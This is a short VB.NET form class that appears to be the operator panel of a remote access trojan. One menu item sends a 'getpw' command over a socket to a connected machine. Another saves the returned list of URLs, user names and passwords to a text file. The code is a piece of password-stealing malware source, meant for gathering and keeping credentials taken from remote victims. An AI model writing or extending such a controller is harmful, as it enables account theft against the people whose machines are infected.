﻿Public Class pw
    Public sock As Integer
    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
        Form1.s.Send(sock, "getpw")
    End Sub

    Private Sub SaveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Dim o As New SaveFileDialog
        o.Filter = "Txtpass|*.Txt"
        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each ll As ListViewItem In ListView1.Items
                My.Computer.FileSystem.WriteAllText(o.FileName, "URL : " & ll.SubItems(0).Text & " User : " & ll.SubItems(1).Text & "Pass  : " & ll.SubItems(2).Text, True)
            Next
            MsgBox("Done", MsgBoxStyle.Information, "")
        End If
    End Sub
End Class